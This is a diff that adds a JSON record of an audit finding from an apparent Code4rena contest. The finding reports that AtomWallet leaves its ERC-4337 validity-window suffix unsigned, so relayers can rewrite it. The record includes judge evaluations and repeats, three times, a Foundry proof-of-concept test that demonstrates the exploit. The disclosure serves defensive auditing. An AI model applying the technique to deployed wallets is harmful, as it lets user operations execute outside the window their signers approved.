@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Intuition_2VUsxVJwReb",
+    "audit_uid": "2VUsxVJwReb",
+    "requested_submission_uid": "QF8LqrzbmVB",
+    "requested_finding_uid": "6YNDfbQYkTa",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Intuition_2VUsxVJwReb/20260618_132553/findings.json",
+    "source_submission_uid": "QF8LqrzbmVB",
+    "source_finding_uid": "6YNDfbQYkTa",
+    "original_report_path": "Intuition_2VUsxVJwReb\\medium_valid_QF8LqrzbmVB.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "QF8LqrzbmVB",
+  "finding_uid": "6YNDfbQYkTa",
+  "finding_number": "9",
+  "title": "[H-01] Unsigned validity-window metadata can be rewritten by relayers",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "adriro",
+  "body": "### Description\n\n`_validateSignature()` strips an optional `(validUntil, validAfter)` suffix from `userOp.signature`, but it only recovers the signer over `userOpHash`. Under ERC-4337 the EntryPoint hash excludes the signature bytes entirely, so a relayer can keep the same 65-byte ECDSA signature and rewrite the trailing validity window without invalidating the signature.\n\n### Impact\n\nA malicious bundler can execute an otherwise valid user operation earlier than `validAfter` or long after `validUntil`, bypassing the signer’s intended timing constraint. Any wallet action encoded in that user operation can then execute outside the user’s approved window.\n\n### Recommendation\n\nCryptographically bind `validUntil` and `validAfter` to the signed payload whenever a 77-byte signature is supplied, or move the validity-window fields into the signed user-operation struct itself.",
+  "proof_of_concept": "### Proof of Concept\n\n1. A user signs a user operation with a short expiry.\n2. A bundler replaces the appended `validUntil` with a much later timestamp while keeping the same 65-byte signature.\n3. `validateUserOp()` still recovers the correct owner and returns the attacker-chosen window.\n4. The stale operation remains executable until the nonce is consumed.\n\n```\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { Test } from \"forge-std/src/Test.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport { EntryPoint } from \"@account-abstraction/core/EntryPoint.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { ValidationData, _parseValidationData } from \"@account-abstraction/core/Helpers.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\n\ncontract MockMultiVaultForAtomWallet {\n    address internal atomWarden;\n\n    constructor(address _atomWarden) {\n        atomWarden = _atomWarden;\n    }\n\n    function getAtomWarden() external view returns (address) {\n        return atomWarden;\n    }\n}\n\ncontract PoC_AtomWallet_UnsignedValidityWindow is Test {\n    uint256 internal constant OWNER_PRIVATE_KEY = 0xA11CE;\n\n    EntryPoint internal entryPoint;\n    AtomWallet internal wallet;\n\n    function setUp() public {\n        entryPoint = new EntryPoint();\n\n        MockMultiVaultForAtomWallet multiVault = new MockMultiVaultForAtomWallet(vm.addr(OWNER_PRIVATE_KEY));\n\n        AtomWallet implementation = new AtomWallet();\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(this), \"\");\n        wallet = AtomWallet(payable(address(proxy)));\n\n        wallet.initialize(address(entryPoint), address(multiVault), bytes32(\"ATOM\"));\n    }\n\n    function test_poc_relayerCanRewriteUnsignedValidityWindow() external {\n        PackedUserOperation memory userOp = PackedUserOperation({\n            sender: address(wallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: \"\",\n            accountGasLimits: bytes32(0),\n            preVerificationGas: 0,\n            gasFees: bytes32(0),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n\n        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);\n        bytes memory rawSignature = _signUserOpHash(userOpHash);\n\n        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);\n        uint48 originalValidAfter = uint48(block.timestamp);\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(originalValidUntil, originalValidAfter));\n\n        bytes32 hashWithOriginalWindow = entryPoint.getUserOpHash(userOp);\n\n        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);\n        uint48 attackerValidAfter = 0;\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(attackerValidUntil, attackerValidAfter));\n\n        bytes32 hashWithModifiedWindow = entryPoint.getUserOpHash(userOp);\n        assertEq(hashWithOriginalWindow, hashWithModifiedWindow, \"EntryPoint hash must ignore signature bytes\");\n\n        vm.prank(address(entryPoint));\n        uint256 validationData = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        ValidationData memory parsed = _parseValidationData(validationData);\n        assertEq(parsed.aggregator, address(0), \"signature should still validate\");\n        assertEq(parsed.validUntil, attackerValidUntil, \"attacker-controlled validUntil should be accepted\");\n        assertEq(parsed.validAfter, attackerValidAfter, \"attacker-controlled validAfter should be accepted\");\n\n        vm.warp(originalValidUntil + 1);\n        assertTrue(block.timestamp > originalValidUntil, \"original window should be expired\");\n        assertTrue(block.timestamp <= parsed.validUntil, \"rewritten window still keeps the op live\");\n    }\n\n    function _signUserOpHash(bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PRIVATE_KEY, ethSignedMessageHash);\n        return abi.encodePacked(r, s, v);\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2026-03-intuition/blob/main/src/protocol/wallet/AtomWallet.sol#L285"
+  ],
+  "source_record": {
+    "project_id": "2VUsxVJwReb",
+    "submission_index": "573",
+    "api_submission_id": "",
+    "uid": "QF8LqrzbmVB",
+    "number": "573",
+    "title": "[H-01] Unsigned validity-window metadata can be rewritten by relayers",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "adriro",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2026-03-intuition/blob/main/src/protocol/wallet/AtomWallet.sol#L285"
+    ],
+    "body": "### Description\n\n`_validateSignature()` strips an optional `(validUntil, validAfter)` suffix from `userOp.signature`, but it only recovers the signer over `userOpHash`. Under ERC-4337 the EntryPoint hash excludes the signature bytes entirely, so a relayer can keep the same 65-byte ECDSA signature and rewrite the trailing validity window without invalidating the signature.\n\n### Impact\n\nA malicious bundler can execute an otherwise valid user operation earlier than `validAfter` or long after `validUntil`, bypassing the signer’s intended timing constraint. Any wallet action encoded in that user operation can then execute outside the user’s approved window.\n\n### Recommendation\n\nCryptographically bind `validUntil` and `validAfter` to the signed payload whenever a 77-byte signature is supplied, or move the validity-window fields into the signed user-operation struct itself.",
+    "proof_of_concept": "### Proof of Concept\n\n1. A user signs a user operation with a short expiry.\n2. A bundler replaces the appended `validUntil` with a much later timestamp while keeping the same 65-byte signature.\n3. `validateUserOp()` still recovers the correct owner and returns the attacker-chosen window.\n4. The stale operation remains executable until the nonce is consumed.\n\n```\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { Test } from \"forge-std/src/Test.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport { EntryPoint } from \"@account-abstraction/core/EntryPoint.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { ValidationData, _parseValidationData } from \"@account-abstraction/core/Helpers.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\n\ncontract MockMultiVaultForAtomWallet {\n    address internal atomWarden;\n\n    constructor(address _atomWarden) {\n        atomWarden = _atomWarden;\n    }\n\n    function getAtomWarden() external view returns (address) {\n        return atomWarden;\n    }\n}\n\ncontract PoC_AtomWallet_UnsignedValidityWindow is Test {\n    uint256 internal constant OWNER_PRIVATE_KEY = 0xA11CE;\n\n    EntryPoint internal entryPoint;\n    AtomWallet internal wallet;\n\n    function setUp() public {\n        entryPoint = new EntryPoint();\n\n        MockMultiVaultForAtomWallet multiVault = new MockMultiVaultForAtomWallet(vm.addr(OWNER_PRIVATE_KEY));\n\n        AtomWallet implementation = new AtomWallet();\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(this), \"\");\n        wallet = AtomWallet(payable(address(proxy)));\n\n        wallet.initialize(address(entryPoint), address(multiVault), bytes32(\"ATOM\"));\n    }\n\n    function test_poc_relayerCanRewriteUnsignedValidityWindow() external {\n        PackedUserOperation memory userOp = PackedUserOperation({\n            sender: address(wallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: \"\",\n            accountGasLimits: bytes32(0),\n            preVerificationGas: 0,\n            gasFees: bytes32(0),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n\n        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);\n        bytes memory rawSignature = _signUserOpHash(userOpHash);\n\n        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);\n        uint48 originalValidAfter = uint48(block.timestamp);\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(originalValidUntil, originalValidAfter));\n\n        bytes32 hashWithOriginalWindow = entryPoint.getUserOpHash(userOp);\n\n        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);\n        uint48 attackerValidAfter = 0;\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(attackerValidUntil, attackerValidAfter));\n\n        bytes32 hashWithModifiedWindow = entryPoint.getUserOpHash(userOp);\n        assertEq(hashWithOriginalWindow, hashWithModifiedWindow, \"EntryPoint hash must ignore signature bytes\");\n\n        vm.prank(address(entryPoint));\n        uint256 validationData = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        ValidationData memory parsed = _parseValidationData(validationData);\n        assertEq(parsed.aggregator, address(0), \"signature should still validate\");\n        assertEq(parsed.validUntil, attackerValidUntil, \"attacker-controlled validUntil should be accepted\");\n        assertEq(parsed.validAfter, attackerValidAfter, \"attacker-controlled validAfter should be accepted\");\n\n        vm.warp(originalValidUntil + 1);\n        assertTrue(block.timestamp > originalValidUntil, \"original window should be expired\");\n        assertTrue(block.timestamp <= parsed.validUntil, \"rewritten window still keeps the op live\");\n    }\n\n    function _signUserOpHash(bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PRIVATE_KEY, ethSignedMessageHash);\n        return abi.encodePacked(r, s, v);\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/2VUsxVJwReb/submissions/573",
+    "raw": {
+      "auditUid": "2VUsxVJwReb",
+      "createdAt": "2026-03-09T01:34:25.879Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "4EipXDisxLv",
+          "userUid": "WYVDNVcjWo5",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T15:24:36.465Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "6YNDfbQYkTa"
+        },
+        {
+          "uid": "rtHRLbynPXk",
+          "userUid": "WYVDNVcjWo5",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T16:50:13.237Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "6YNDfbQYkTa"
+        },
+        {
+          "uid": "6vtHz5dNCSH",
+          "userUid": "WYVDNVcjWo5",
+          "userAuditRole": "judge",
+          "createdAt": "2026-03-11T16:57:58.921Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "QF8LqrzbmVB",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "6YNDfbQYkTa",
+        "number": 9,
+        "duplicates": 60
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "medium",
+        "validity": "valid",
+        "updatedAt": "2026-04-28T14:24:44.015Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "[H-01] Unsigned validity-window metadata can be rewritten by relayers",
+      "uid": "QF8LqrzbmVB",
+      "updatedAt": "2026-03-09T01:34:25.879Z",
+      "user": {
+        "uid": "HLoNetyPRKG",
+        "handle": "adriro"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "### Description\n\n`_validateSignature()` strips an optional `(validUntil, validAfter)` suffix from `userOp.signature`, but it only recovers the signer over `userOpHash`. Under ERC-4337 the EntryPoint hash excludes the signature bytes entirely, so a relayer can keep the same 65-byte ECDSA signature and rewrite the trailing validity window without invalidating the signature.\n\n### Impact\n\nA malicious bundler can execute an otherwise valid user operation earlier than `validAfter` or long after `validUntil`, bypassing the signer’s intended timing constraint. Any wallet action encoded in that user operation can then execute outside the user’s approved window.\n\n### Recommendation\n\nCryptographically bind `validUntil` and `validAfter` to the signed payload whenever a 77-byte signature is supplied, or move the validity-window fields into the signed user-operation struct itself.",
+      "proofOfConcept": "### Proof of Concept\n\n1. A user signs a user operation with a short expiry.\n2. A bundler replaces the appended `validUntil` with a much later timestamp while keeping the same 65-byte signature.\n3. `validateUserOp()` still recovers the correct owner and returns the attacker-chosen window.\n4. The stale operation remains executable until the nonce is consumed.\n\n```\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { Test } from \"forge-std/src/Test.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport { EntryPoint } from \"@account-abstraction/core/EntryPoint.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { ValidationData, _parseValidationData } from \"@account-abstraction/core/Helpers.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\n\ncontract MockMultiVaultForAtomWallet {\n    address internal atomWarden;\n\n    constructor(address _atomWarden) {\n        atomWarden = _atomWarden;\n    }\n\n    function getAtomWarden() external view returns (address) {\n        return atomWarden;\n    }\n}\n\ncontract PoC_AtomWallet_UnsignedValidityWindow is Test {\n    uint256 internal constant OWNER_PRIVATE_KEY = 0xA11CE;\n\n    EntryPoint internal entryPoint;\n    AtomWallet internal wallet;\n\n    function setUp() public {\n        entryPoint = new EntryPoint();\n\n        MockMultiVaultForAtomWallet multiVault = new MockMultiVaultForAtomWallet(vm.addr(OWNER_PRIVATE_KEY));\n\n        AtomWallet implementation = new AtomWallet();\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(this), \"\");\n        wallet = AtomWallet(payable(address(proxy)));\n\n        wallet.initialize(address(entryPoint), address(multiVault), bytes32(\"ATOM\"));\n    }\n\n    function test_poc_relayerCanRewriteUnsignedValidityWindow() external {\n        PackedUserOperation memory userOp = PackedUserOperation({\n            sender: address(wallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: \"\",\n            accountGasLimits: bytes32(0),\n            preVerificationGas: 0,\n            gasFees: bytes32(0),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n\n        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);\n        bytes memory rawSignature = _signUserOpHash(userOpHash);\n\n        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);\n        uint48 originalValidAfter = uint48(block.timestamp);\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(originalValidUntil, originalValidAfter));\n\n        bytes32 hashWithOriginalWindow = entryPoint.getUserOpHash(userOp);\n\n        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);\n        uint48 attackerValidAfter = 0;\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(attackerValidUntil, attackerValidAfter));\n\n        bytes32 hashWithModifiedWindow = entryPoint.getUserOpHash(userOp);\n        assertEq(hashWithOriginalWindow, hashWithModifiedWindow, \"EntryPoint hash must ignore signature bytes\");\n\n        vm.prank(address(entryPoint));\n        uint256 validationData = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        ValidationData memory parsed = _parseValidationData(validationData);\n        assertEq(parsed.aggregator, address(0), \"signature should still validate\");\n        assertEq(parsed.validUntil, attackerValidUntil, \"attacker-controlled validUntil should be accepted\");\n        assertEq(parsed.validAfter, attackerValidAfter, \"attacker-controlled validAfter should be accepted\");\n\n        vm.warp(originalValidUntil + 1);\n        assertTrue(block.timestamp > originalValidUntil, \"original window should be expired\");\n        assertTrue(block.timestamp <= parsed.validUntil, \"rewritten window still keeps the op live\");\n    }\n\n    function _signUserOpHash(bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PRIVATE_KEY, ethSignedMessageHash);\n        return abi.encodePacked(r, s, v);\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2026-03-intuition/blob/main/src/protocol/wallet/AtomWallet.sol#L285",
+      "number": 573,
+      "aiExplanation": null,
+      "_index": 573
+    }
+  }
+}
